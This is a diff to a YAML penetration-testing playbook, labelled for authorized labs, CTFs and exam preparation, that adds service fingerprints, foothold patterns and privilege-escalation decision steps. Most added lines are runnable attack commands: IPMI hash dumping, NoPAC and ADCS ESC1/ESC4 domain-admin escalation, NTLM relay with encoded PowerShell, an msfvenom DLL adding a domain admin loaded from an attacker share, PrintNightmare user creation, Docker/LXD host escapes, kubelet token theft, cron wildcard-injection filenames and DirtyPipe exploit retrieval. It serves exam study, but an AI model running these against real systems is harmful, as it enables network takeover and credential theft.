@@ -1,6 +1,17 @@
-schema_version: 2.1
+schema_version: 2.2
 intended_use: Authorized labs, CTFs, and exam preparation only
-last_updated: 2026-03-12
+last_updated: 2026-03-13
+# v2.2 additions (spellbook integration):
+#   fingerprint_map: +15 entries (IPMI, Rsync, MongoDB, NATS, IMAP, GraphQL,
+#     WebSocket, Timeroast, LAPS, NoPAC, ADCS, Kubernetes, Docker API,
+#     PrintNightmare, RelayPotato)
+#   foothold_patterns: +20 patterns (IPMI-HASH-CAPTURE, RSYNC-ANON-READ,
+#     MONGODB-NOAUTH, NATS-ENUM, TIMEROASTING, GRAPHQL-ENUM, WEBSOCKET-ATTACK,
+#     NOPAC-ESCALATION, ADCS-ESC1, ADCS-ESC4, DACL-GENERICWRITE,
+#     BLOODHOUND-COLLECTION, NTLM-RELAY-CAPTURE, RELAY-POTATO,
+#     DNS-ADMINS-DLL, PRINTNIGHTMARE, UAC-BYPASS, DOCKER-SOCKET-ESCAPE,
+#     LXC-PRIVESC, KUBERNETES-HOSTPATH, LAPS-READ, WILDCARD-INJECTION,
+#     KERNEL-CVE-DIRTYPIPE)
 
 # ─────────────────────────────────────────────────────────────────────────────
 # SERVICE FINGERPRINT MAP
@@ -409,6 +420,212 @@ service_fingerprint_map:
     recommended_enumeration:
       - curl http://<target>:9200/_cat/indices
       - curl http://<target>:9200/_cluster/settings
+
+  # ── IPMI ────────────────────────────────────────────────────────────────
+  - match:
+      service: ipmi
+      port_in:
+        - 623
+    priority: 8
+    likely_paths:
+      - IPMI-HASH-CAPTURE
+      - DEFAULT-CREDS
+    recommended_enumeration:
+      - nmap -sU --script ipmi-version -p 623 <target>
+      - msfconsole use auxiliary/scanner/ipmi/ipmi_dumphashes
+
+  # ── Rsync ────────────────────────────────────────────────────────────────
+  - match:
+      service: rsync
+      port_in:
+        - 873
+    priority: 7
+    likely_paths:
+      - RSYNC-ANON-READ
+    recommended_enumeration:
+      - rsync --list-only rsync://<target>/
+      - nc -nv <target> 873
+
+  # ── MongoDB ──────────────────────────────────────────────────────────────
+  - match:
+      service: mongodb
+      port_in:
+        - 27017
+        - 27018
+        - 27019
+    priority: 8
+    likely_paths:
+      - MONGODB-NOAUTH
+      - DB-CREDENTIAL-DISCOVERY
+    recommended_enumeration:
+      - mongosh mongodb://<target>:27017
+      - nmap -sV --script mongodb-info -p 27017 <target>
+
+  # ── NATS ─────────────────────────────────────────────────────────────────
+  - match:
+      service: nats
+      port_in:
+        - 4222
+        - 8222
+    priority: 6
+    likely_paths:
+      - NATS-ENUM
+    recommended_enumeration:
+      - nats --server nats://<target>:4222 stream ls
+      - curl http://<target>:8222/varz
+
+  # ── IMAP ─────────────────────────────────────────────────────────────────
+  - match:
+      service: imap
+      port_in:
+        - 143
+        - 993
+    priority: 5
+    likely_paths:
+      - MAIL-ENUM
+      - CREDENTIAL-REUSE
+    recommended_enumeration:
+      - openssl s_client -connect <target>:imaps
+      - curl -k imaps://<target> --user user:pass -v
+
+  # ── GraphQL ──────────────────────────────────────────────────────────────
+  - match:
+      service: http
+      product_contains:
+        - graphql
+        - GraphQL
+    priority: 8
+    likely_paths:
+      - GRAPHQL-ENUM
+      - SQLI
+    recommended_enumeration:
+      - python3 graphw00f/main.py -d -f -t http://<target>
+      - "manual: POST /graphql {query: '{__schema{types{name}}}'}"
+
+  # ── WebSocket ────────────────────────────────────────────────────────────
+  - match:
+      service: http
+      port_in:
+        - 80
+        - 443
+        - 8080
+        - 8443
+    priority: 5
+    likely_paths:
+      - WEBSOCKET-ATTACK
+    recommended_enumeration:
+      - "Burp Suite: intercept WS messages, replay/modify"
+
+  # ── Timeroast (Kerberos computer account RC4) ────────────────────────────
+  - match:
+      service: kerberos-sec
+      port_in:
+        - 88
+    priority: 7
+    likely_paths:
+      - TIMEROASTING
+      - ASREPROAST
+      - KERBEROAST
+    recommended_enumeration:
+      - nxc smb <dc-ip> -M timeroast
+      - impacket-GetNPUsers domain/ -dc-ip <target> -request -format hashcat
+
+  # ── LAPS ─────────────────────────────────────────────────────────────────
+  - match:
+      service: ldap
+      port_in:
+        - 389
+        - 636
+        - 3268
+    priority: 7
+    likely_paths:
+      - LAPS-READ
+      - AD-SURFACE
+      - DACL-GENERICWRITE
+    recommended_enumeration:
+      - netexec ldap <target> -u user -p pass --module laps
+      - ldapsearch -x -H ldap://<target> -D user@domain -w pass -b "DC=domain,DC=local" ms-MCS-AdmPwd
+
+  # ── NoPAC (CVE-2021-42278/42287) ─────────────────────────────────────────
+  - match:
+      service: ldap
+      port_in:
+        - 389
+    priority: 9
+    likely_paths:
+      - NOPAC-ESCALATION
+      - AD-SURFACE
+    recommended_enumeration:
+      - python3 scanner.py "domain/user:pass" -dc-ip <target> -use-ldap
+
+  # ── ADCS / certipy ───────────────────────────────────────────────────────
+  - match:
+      service: http
+      product_contains:
+        - Microsoft Certificate Services
+        - certsrv
+    priority: 9
+    likely_paths:
+      - ADCS-ESC1
+      - ADCS-ESC4
+    recommended_enumeration:
+      - certipy find -u user@domain -p pass -dc-ip <target>
+      - certipy find -u user@domain -p pass -dc-ip <target> -vulnerable -stdout
+
+  # ── Kubernetes kubelet ────────────────────────────────────────────────────
+  - match:
+      service: http
+      port_in:
+        - 10250
+        - 10255
+        - 6443
+    priority: 8
+    likely_paths:
+      - KUBERNETES-HOSTPATH
+    recommended_enumeration:
+      - kubeletctl -i --server <target> pods
+      - kubeletctl -i --server <target> scan rce
+      - curl -sk https://<target>:10250/pods
+
+  # ── Docker API (unauthenticated) ──────────────────────────────────────────
+  - match:
+      service: http
+      port_in:
+        - 2375
+        - 2376
+    priority: 9
+    likely_paths:
+      - DOCKER-SOCKET-ESCAPE
+    recommended_enumeration:
+      - curl http://<target>:2375/version
+      - docker -H tcp://<target>:2375 ps
+
+  # ── PrintNightmare / MS-RPRN ──────────────────────────────────────────────
+  - match:
+      service: msrpc
+      port_in:
+        - 135
+        - 445
+    priority: 8
+    likely_paths:
+      - PRINTNIGHTMARE
+      - SMB-ANON-SHARE-CREDS
+    recommended_enumeration:
+      - impacket-rpcdump @<target> | egrep 'MS-RPRN|MS-PAR'
+      - "ls \\\\localhost\\pipe\\spoolss (on target)"
+
+  # ── RelayPotato / cross-session relay ────────────────────────────────────
+  - match:
+      service: msrpc
+      port_in:
+        - 135
+    priority: 7
+    likely_paths:
+      - RELAY-POTATO
+      - NTLM-RELAY-CAPTURE
+    recommended_enumeration:
+      - "check SeImpersonatePrivilege: whoami /priv"
+      - "check for active RDP/interactive sessions: query session"
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -1227,6 +1444,472 @@ foothold_patterns:
       - test reuse of any recovered information
     estimated_exam_frequency: medium
 
+  # ── NEW PATTERNS FROM SPELLBOOK INTEGRATION ─────────────────────────────
+
+  - id: IPMI-HASH-CAPTURE
+    name: IPMI Cipher Zero Hash Capture
+    trigger:
+      ports: [623]
+      protocol: udp
+      service: ipmi
+    description: >
+      IPMI cipher 0 allows authentication bypass — sends credential request
+      that returns an HMAC hash crackable offline. Default creds also common
+      across Dell iDRAC (root/calvin), HP iLO (Administrator/<random>),
+      Supermicro (ADMIN/ADMIN).
+    enumeration_commands:
+      - nmap -sU --script ipmi-version -p 623 <target>
+      - msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <target>; run'
+      - ipmitool -I lanplus -H <target> -U root -P calvin chassis status
+    likely_next_steps:
+      - crack captured hash with hashcat -m 7300
+      - attempt default credentials (root/calvin, ADMIN/ADMIN)
+      - use ipmitool for BMC control if creds valid
+    estimated_exam_frequency: low_medium
+
+  - id: RSYNC-ANON-READ
+    name: Rsync Anonymous Module Read/Write
+    trigger:
+      ports: [873]
+      service: rsync
+    description: >
+      Rsync modules exposed without authentication allow listing and
+      downloading files. Writable modules allow planting SSH authorized_keys
+      or web shells.
+    enumeration_commands:
+      - rsync --list-only rsync://<target>/
+      - nc -nv <target> 873
+      - rsync -av rsync://<target>/<module>/
+    likely_next_steps:
+      - download all files from exposed module
+      - if writable plant ~/.ssh/authorized_keys
+      - check for config files passwords scripts
+    estimated_exam_frequency: low_medium
+
+  - id: MONGODB-NOAUTH
+    name: MongoDB Unauthenticated Access
+    trigger:
+      ports: [27017, 27018, 27019]
+      service: mongodb
+    description: >
+      MongoDB instances without authentication expose all databases and
+      collections. Common in CTF and older deployments.
+    enumeration_commands:
+      - mongosh mongodb://<target>:27017
+      - "mongosh> show databases"
+      - "mongosh> use <db>; db.getCollectionNames()"
+      - "mongosh> db.<collection>.find().pretty()"
+    likely_next_steps:
+      - dump all collections for credentials
+      - look for user/password/session/token documents
+      - check for admin collection with hashed passwords
+    estimated_exam_frequency: low_medium
+
+  - id: NATS-ENUM
+    name: NATS Messaging System Enumeration
+    trigger:
+      ports: [4222, 8222]
+      service: nats
+    description: >
+      NATS pub/sub message bus. Unauthenticated instances expose all subjects
+      and messages. Can intercept credentials or internal API calls in transit.
+    enumeration_commands:
+      - nats --server nats://<target>:4222 stream ls
+      - nats --server nats://<target>:4222 sub '>'
+      - curl http://<target>:8222/varz
+      - curl http://<target>:8222/subsz
+    likely_next_steps:
+      - subscribe to all subjects with wildcard >
+      - intercept credentials in messages
+      - publish crafted messages to trigger internal actions
+    estimated_exam_frequency: low
+
+  - id: TIMEROASTING
+    name: Timeroasting — Computer Account RC4 Hash
+    trigger:
+      ports: [88]
+      service: kerberos-sec
+      condition: unauthenticated domain access
+    description: >
+      Sends SNTP packets to DC which responds with RC4-encrypted MACs using
+      computer account NTLM hashes. Crackable without any domain credentials.
+      Tool: nxc timeroast module.
+    enumeration_commands:
+      - nxc smb <dc-ip> -M timeroast
+      - hashcat -a 0 -m 31300 --user ./hashes /usr/share/wordlists/rockyou.txt
+    likely_next_steps:
+      - crack hash to recover computer account password
+      - use computer account for further AD enumeration
+    estimated_exam_frequency: low_medium
+
+  - id: GRAPHQL-ENUM
+    name: GraphQL Introspection and Abuse
+    trigger:
+      services: [http, https]
+      indicators:
+        - /graphql endpoint
+        - application/json POST with query field
+    description: >
+      GraphQL APIs often expose introspection allowing full schema discovery.
+      Can lead to auth bypass via nested queries, batch attacks, IDOR, and
+      SQLi via unsanitized arguments.
+    enumeration_commands:
+      - "python3 graphw00f/main.py -d -f -t http://<target>"
+      - "POST /graphql {\"query\":\"{__schema{types{name}}}\"}"
+      - "POST /graphql {\"query\":\"{__schema{queryType{fields{name}}}}\"}"
+    likely_next_steps:
+      - enumerate all queries and mutations via introspection
+      - test each field for injection
+      - try alias batching for rate limit bypass
+      - use InQL Burp extension for automated analysis
+    estimated_exam_frequency: medium
+
+  - id: WEBSOCKET-ATTACK
+    name: WebSocket Message Manipulation
+    trigger:
+      services: [http, https]
+      indicators:
+        - ws:// or wss:// connections observed
+        - Upgrade: websocket header
+    description: >
+      WebSocket connections bypass some WAF rules. Messages may be injectable
+      with SQLi, XSS, or command injection. Cross-Site WebSocket Hijacking
+      (CSWSH) possible if no CSRF token in handshake.
+    enumeration_commands:
+      - "Burp Suite: Proxy > WebSockets history"
+      - "Intercept and replay messages in Burp Repeater"
+      - "Test payloads: ' OR 1=1--, <script>alert(1)</script>, ;id"
+    likely_next_steps:
+      - replay/modify messages in Burp Repeater
+      - inject SQLi payloads into message body fields
+      - attempt CSWSH from attacker-controlled page
+    estimated_exam_frequency: low_medium
+
+  - id: NOPAC-ESCALATION
+    name: NoPAC — CVE-2021-42278/42287 DA Escalation
+    trigger:
+      services: [ldap, kerberos-sec]
+      condition: standard domain user account with MachineAccountQuota >= 1
+    description: >
+      Renames a computer account SamAccountName to match a DC's, then requests
+      a TGT before renaming back. The resulting TGS grants DA-level access.
+      Requires ability to add computer accounts (default quota = 10).
+    enumeration_commands:
+      - python3 scanner.py "domain/user:pass" -dc-ip <target> -use-ldap
+      - python3 noPac.py "domain/user:pass" -dc-ip <target> -dc-host dc01 -shell
+    likely_next_steps:
+      - run scanner first to confirm vulnerability
+      - exploit to get SYSTEM shell on DC
+      - dump hashes with secretsdump
+    estimated_exam_frequency: medium_high
+
+  - id: ADCS-ESC1
+    name: ADCS ESC1 — Subject Alternative Name Abuse
+    trigger:
+      services: [http, ldap]
+      indicators:
+        - Certificate Services web enrollment accessible
+        - certipy finds vulnerable templates
+    description: >
+      ESC1: Certificate template allows SAN specification by enrollee and
+      does not require manager approval. Allows impersonating any user
+      including Domain Admin by enrolling with arbitrary SAN.
+    enumeration_commands:
+      - certipy find -u user@domain -p pass -dc-ip <target> -vulnerable -stdout
+      - certipy req -u user@domain -p pass -ca <CA-name> -template <template> -upn administrator@domain -dc-ip <target>
+      - certipy auth -pfx administrator.pfx -dc-ip <target>
+    likely_next_steps:
+      - find vulnerable templates with certipy find
+      - request cert with admin UPN as SAN
+      - authenticate with cert to get NTLM hash
+      - pass the hash or use TGT
+    estimated_exam_frequency: high
+
+  - id: ADCS-ESC4
+    name: ADCS ESC4 — Template Write Access
+    trigger:
+      services: [ldap]
+      condition: GenericWrite on certificate template object
+    description: >
+      ESC4: User has write access to a certificate template. Modify template
+      to enable ESC1 conditions, exploit, then restore. bloodyAD or
+      certipy shadow can be used.
+    enumeration_commands:
+      - certipy find -u user@domain -p pass -dc-ip <target> -vulnerable
+      - certipy template -u user@domain -p pass -template <template> -save-old
+      - certipy req -u user@domain -p pass -ca <CA> -template <template> -upn administrator@domain
+    likely_next_steps:
+      - modify template to allow SAN enrollment
+      - request cert impersonating DA
+      - restore original template
+    estimated_exam_frequency: medium
+
+  - id: DACL-GENERICWRITE
+    name: DACL Abuse — GenericWrite/GenericAll
+    trigger:
+      services: [ldap]
+      condition: GenericWrite GenericAll WriteDACL or ForceChangePassword on object
+    description: >
+      ACE abuse against AD objects. GenericWrite allows targeted Kerberoasting
+      or shadow credentials. GenericAll allows password reset or group membership
+      change. WriteDACL allows granting self GenericAll. Discovered via BloodHound.
+    enumeration_commands:
+      - bloodhound-python -c ALL -ns <dc-ip> -u user -p pass -d domain --zip
+      - bloodyAD --host <target> -d domain -u user -p pass get object <TARGET> --attr ntSecurityDescriptor
+      - python3 targetedKerberoast.py -d domain -u user -p pass --request-user victim
+    likely_next_steps:
+      - GenericWrite on user → targeted Kerberoast or shadow creds
+      - GenericAll → reset password with bloodyAD
+      - WriteDACL → grant self GenericAll then reset DA password
+      - ForceChangePassword → net rpc password or bloodyAD
+    estimated_exam_frequency: high
+
+  - id: BLOODHOUND-COLLECTION
+    name: BloodHound AD Attack Path Discovery
+    trigger:
+      services: [ldap, smb]
+      condition: valid domain credentials obtained
+    description: >
+      BloodHound maps AD object relationships to reveal attack paths to DA.
+      SharpHound (Windows) or bloodhound-python (Linux) collect data.
+      Essential after gaining any domain foothold.
+    enumeration_commands:
+      - bloodhound-python -c ALL -ns <dc-ip> -u user -p pass -d domain --zip
+      - bloodhound-python -c ALL -ns <dc-ip> -u user -p pass -d domain --dns-tcp --zip
+      - rusthound -d domain -u user -p pass -o ./bh --zip
+    likely_next_steps:
+      - import zip to BloodHound neo4j instance
+      - run shortest path to DA query
+      - identify Kerberoastable / ASREPRoastable users
+      - find principals with DCSync rights
+    estimated_exam_frequency: very_high
+
+  - id: NTLM-RELAY-CAPTURE
+    name: NTLM Relay Attack
+    trigger:
+      services: [smb, http]
+      condition: SMB signing disabled on target
+    description: >
+      Captures NetNTLM authentication and relays to another target without
+      cracking. Responder captures, ntlmrelayx relays. PetitPotam or
+      PrinterBug force authentication from target machines.
+    enumeration_commands:
+      - responder -I eth0 -wd
+      - impacket-ntlmrelayx --no-http-server -smb2support -t <target>
+      - impacket-ntlmrelayx --no-http-server -smb2support -t <target> -c 'powershell -enc <base64>'
+      - python3 PetitPotam.py <attacker-ip> <target>
+    likely_next_steps:
+      - dump SAM database by default
+      - execute reverse shell with -c flag
+      - combine with SMB signing check first
+    estimated_exam_frequency: high
+
+  - id: RELAY-POTATO
+    name: RelayPotato — Cross-Session RPC Relay
+    trigger:
+      services: [msrpc]
+      condition: SeImpersonatePrivilege active sessions present
+    description: >
+      Uses RPC quirk to force authenticated NTLM request from a logged-in
+      user to attacker-controlled port 9999, extracts NetNTLMv2 hash, relays
+      to localhost. Works on Server 2016+ where other Potato variants fail.
+    enumeration_commands:
+      - whoami /priv
+      - query session
+      - RelayPotato.exe -p "cmd.exe /c whoami > C:\out.txt"
+    likely_next_steps:
+      - confirm SeImpersonatePrivilege
+      - confirm active interactive sessions
+      - use for SYSTEM shell when GodPotato/PrintSpoofer not available
+    estimated_exam_frequency: low_medium
+
+  - id: DNS-ADMINS-DLL
+    name: DNSAdmins Group DLL Injection
+    trigger:
+      services: [dns, ldap]
+      condition: member of DNSAdmins group
+    description: >
+      DNSAdmins members can configure DNS server DLL plugin path via
+      dnscmd. DNS typically runs as SYSTEM on DC. Inject malicious DLL
+      to execute as NT AUTHORITY\SYSTEM.
+    enumeration_commands:
+      - net user <user> /domain
+      - msfvenom -p windows/x64/exec cmd='net group "domain admins" <user> /add /domain' -f dll -o adduser.dll
+      - dnscmd.exe /config /serverlevelplugindll \\<attacker>\share\adduser.dll
+      - sc stop dns && sc start dns
+    likely_next_steps:
+      - confirm DNSAdmins membership
+      - host DLL on SMB share
+      - restart DNS service to trigger
+      - clean up DLL path after exploitation
+    estimated_exam_frequency: medium
+
+  - id: PRINTNIGHTMARE
+    name: PrintNightmare — CVE-2021-34527
+    trigger:
+      services: [msrpc, smb]
+      condition: print spooler running
+    description: >
+      Windows Print Spooler RCE. Remote variant uses MS-RPRN/MS-PAR to load
+      malicious DLL as SYSTEM. Local variant adds admin user via PowerShell
+      module. Affects most unpatched Windows systems.
+    enumeration_commands:
+      - impacket-rpcdump @<target> | egrep 'MS-RPRN|MS-PAR'
+      - ls \\\\localhost\\pipe\\spoolss
+      - Import-Module .\CVE-2021-1675.ps1
+      - Invoke-Nightmare -NewUser hacker -NewPassword P@ss123
+    likely_next_steps:
+      - check spooler with rpcdump
+      - local exploit to add admin user
+      - remote exploit via msfvenom DLL
+    estimated_exam_frequency: medium
+
+  - id: UAC-BYPASS
+    name: UAC Bypass — Admin to High Integrity
+    trigger:
+      services: []
+      condition: admin account shell without high integrity token
+    description: >
+      UAC prevents admin shell from being fully elevated. Several bypass
+      techniques exist to get high-integrity shell without UAC prompt.
+      Required before Mimikatz, SeImpersonate, and many Windows privesc.
+    enumeration_commands:
+      - REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
+      - whoami /groups | findstr "High Mandatory"
+      - UACMe (akagi64.exe) for automated bypass
+      - eventvwr.exe hijack via HKCU registry
+    likely_next_steps:
+      - confirm UAC level in registry
+      - use UACMe method 23 (eventvwr) or method 61 (sdclt)
+      - verify high integrity with whoami /groups after bypass
+    estimated_exam_frequency: medium
+
+  - id: DOCKER-SOCKET-ESCAPE
+    name: Docker Socket / Privileged Container Escape
+    trigger:
+      services: [http]
+      ports: [2375, 2376]
+      condition: docker group membership or /var/run/docker.sock accessible
+    description: >
+      Access to Docker socket (unix or TCP) allows creating privileged
+      containers with host filesystem mounted, leading to full host compromise.
+      Docker group membership equivalent to root.
+    enumeration_commands:
+      - docker -H unix:///var/run/docker.sock ps
+      - docker -H unix:///var/run/docker.sock run --rm -d --privileged -v /:/hostsystem alpine
+      - docker -H unix:///var/run/docker.sock exec -it <container> chroot /hostsystem sh
+      - curl http://<target>:2375/version
+    likely_next_steps:
+      - mount host / to /hostsystem in container
+      - chroot into host filesystem
+      - write SSH key or set SUID on bash
+    estimated_exam_frequency: medium
+
+  - id: LXC-PRIVESC
+    name: LXC/LXD Group Privilege Escalation
+    trigger:
+      services: []
+      condition: user in lxd group
+    description: >
+      LXD group membership allows creating privileged containers with host
+      disk mounted. User imports Alpine image and mounts root filesystem
+      to escape to full host access.
+    enumeration_commands:
+      - id | grep lxd
+      - lxc image import alpine.tar.gz --alias alpine
+      - lxc init alpine privesc -c security.privileged=true
+      - lxc config device add privesc host-root disk source=/ path=/r recursive=true
+      - lxc start privesc && lxc exec privesc -- /bin/sh
+    likely_next_steps:
+      - confirm lxd group membership
+      - transfer Alpine image from attacker
+      - mount host / and chroot
+    estimated_exam_frequency: low_medium
+
+  - id: KUBERNETES-HOSTPATH
+    name: Kubernetes Kubelet RCE and Token Extraction
+    trigger:
+      ports: [10250, 10255, 6443]
+      service: http
+    description: >
+      Unauthenticated kubelet API allows pod listing and command execution.
+      Service account tokens with cluster-admin binding allow full cluster
+      takeover. hostPath volumes allow reading host filesystem.
+    enumeration_commands:
+      - kubeletctl -i --server <target> pods
+      - kubeletctl -i --server <target> scan rce
+      - kubeletctl -i --server <target> exec "id" -p <pod> -c <container>
+      - kubeletctl -i --server <target> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p <pod> -c <container>
+    likely_next_steps:
+      - extract service account token from pod
+      - check token permissions with kubectl auth can-i --list
+      - if cluster-admin create privileged pod with hostPath /
+    estimated_exam_frequency: low_medium
+
+  - id: LAPS-READ
+    name: LAPS Password Read
+    trigger:
+      services: [ldap, smb]
+      condition: LAPS deployed user in LAPS_Readers group
+    description: >
+      LAPS stores local administrator passwords in AD attribute ms-MCS-AdmPwd.
+      Users in LAPS_Readers (or with GenericAll on computer object) can read
+      the plaintext password via LDAP or netexec.
+    enumeration_commands:
+      - netexec ldap <target> -u user -p pass --module laps
+      - netexec smb <target> -u user -p pass -M laps
+      - ldapsearch -x -H ldap://<target> -D user@domain -w pass -b "DC=domain,DC=local" ms-MCS-AdmPwd
+      - Get-ADComputer <computer> -Properties ms-MCS-AdmPwd | Select ms-MCS-AdmPwd
+    likely_next_steps:
+      - read ms-MCS-AdmPwd attribute
+      - use recovered password for local admin RDP/SMB/WinRM
+      - attempt password reuse across other machines
+    estimated_exam_frequency: medium_high
+
+  - id: WILDCARD-INJECTION
+    name: Wildcard Injection in Cron/Scheduled Tasks
+    trigger:
+      services: []
+      condition: cron job uses wildcard with tar rsync chown
+    description: >
+      When cron runs tar/rsync/chown with a wildcard * in a writable directory,
+      filenames are passed as arguments. Attacker creates files named like flags
+      (--checkpoint-action=exec=sh shell.sh) to inject commands as root.
+    enumeration_commands:
+      - cat /etc/crontab
+      - ls -la /etc/cron.*
+      - "echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/shell.sh"
+      - "echo '' > '/home/user/--checkpoint=1'"
+      - "echo '' > '/home/user/--checkpoint-action=exec=sh shell.sh'"
+    likely_next_steps:
+      - identify writable directory used by cron wildcard job
+      - create malicious filenames as flag arguments
+      - wait for cron execution
+      - /tmp/bash -p for root shell
+    estimated_exam_frequency: medium
+
+  - id: KERNEL-CVE-DIRTYPIPE
+    name: Kernel CVE — DirtyPipe / Netfilter
+    trigger:
+      services: []
+      condition: Linux kernel version in vulnerable range
+    description: >
+      DirtyPipe (CVE-2022-0847): kernels 5.8-5.17, overwrites read-only files
+      via pipe. Exploit-1 edits /etc/passwd, exploit-2 executes SUID binary.
+      Netfilter CVEs (CVE-2021-22555, CVE-2022-25636, CVE-2023-32233) affect
+      various kernel ranges. Always check uname -r first.
+    enumeration_commands:
+      - uname -r
+      - git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
+      - bash compile.sh && ./exploit-1
+      - searchsploit linux kernel $(uname -r | cut -d. -f1,2)
+    likely_next_steps:
+      - check uname -r against CVE affected ranges
+      - compile on target to avoid arch issues
+      - DirtyPipe exploit-1 for /etc/passwd write
+      - DirtyPipe exploit-2 for SUID binary execution
+    estimated_exam_frequency: medium
+
 
 # ─────────────────────────────────────────────────────────────────────────────
 # LINUX PRIVILEGE ESCALATION DECISION TREE
@@ -1334,11 +2017,46 @@ linux_privesc_decision_tree:
       if_no: LINUX-STEP-08
 
     - id: LINUX-STEP-08
-      question: Is the kernel/service version old enough to justify local exploit research?
+      question: Is the user in docker, lxd, disk, or adm group?
       commands:
-        - uname -a
+        - id
+        - groups
+        - cat /etc/group | grep -E "docker|lxd|disk|adm|video|shadow"
+      look_for:
+        - docker group → docker socket escape
+        - lxd group → LXC privileged container mount
+        - disk group → direct read of block device
+        - adm group → read auth logs for credentials
+      if_yes: LINUX-ROOT-CANDIDATE
+      if_no: LINUX-STEP-09
+
+    - id: LINUX-STEP-09
+      question: Are cron jobs using wildcards in writable directories?
+      commands:
+        - cat /etc/crontab
+        - ls -la /etc/cron.*
+        - find / -name "*.sh" -writable 2>/dev/null
+      look_for:
+        - tar -zcf /path/* (wildcard injection)
+        - rsync with wildcard in writable dir
+        - chown with wildcard
+      if_yes: LINUX-ROOT-CANDIDATE
+      if_no: LINUX-STEP-10
+
+    - id: LINUX-STEP-10
+      question: Is the kernel version vulnerable to a known local CVE?
+      commands:
+        - uname -r
         - cat /etc/os-release
         - dpkg -l | grep linux-image
+        - searchsploit linux kernel $(uname -r | cut -d. -f1,2)
+      look_for:
+        - 5.8-5.17 → DirtyPipe CVE-2022-0847
+        - 2.6-5.11 → CVE-2021-22555 Netfilter
+        - 5.4-5.6 → CVE-2022-25636 Netfilter
+        - "up to 6.3.1 → CVE-2023-32233 Netfilter"
+        - 1.8.x-1.9.x sudo → CVE-2021-3156 Baron Samedit
+        - logrotate 3.8.6/3.11.0/3.15.0/3.18.0 → logrotten
       if_yes: LINUX-LAST-RESORT
       if_no: LINUX-END
 
@@ -1418,6 +2136,13 @@ windows_privesc_decision_tree:
         - DnsAdmins (DLL injection via DNS service)
         - Hyper-V related groups
         - developer tooling with elevated hooks
+        - Print Operators (SeLoadDriverPrivilege → Capcom.sys)
+        - Event Log Readers (credential harvest from logs)
+        - LAPS_Readers (read local admin passwords from AD)
+      commands:
+        - net user <user> /domain
+        - whoami /groups
+        - net localgroup
       if_yes: WIN-PRIV-CANDIDATE
       if_no: WIN-STEP-07
 
@@ -1427,6 +2152,22 @@ windows_privesc_decision_tree:
         - systeminfo
         - wmic qfe list
       if_yes: WIN-LAST-RESORT
+      if_no: WIN-STEP-08
+
+    - id: WIN-STEP-08
+      question: Are there UAC bypass or PrintNightmare opportunities?
+      look_for:
+        - admin account without high-integrity token (UAC bypass needed)
+        - Print Spooler service running (PrintNightmare CVE-2021-34527)
+        - AlwaysInstallElevated both HKLM+HKCU set to 1
+        - NoPAC conditions (domain user + MachineAccountQuota >= 1)
+      commands:
+        - REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
+        - impacket-rpcdump @<target> | egrep 'MS-RPRN|MS-PAR'
+        - reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+        - reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+        - python3 scanner.py "domain/user:pass" -dc-ip <dc> -use-ldap
+      if_yes: WIN-PRIV-CANDIDATE
       if_no: WIN-END
 
   terminal_nodes:
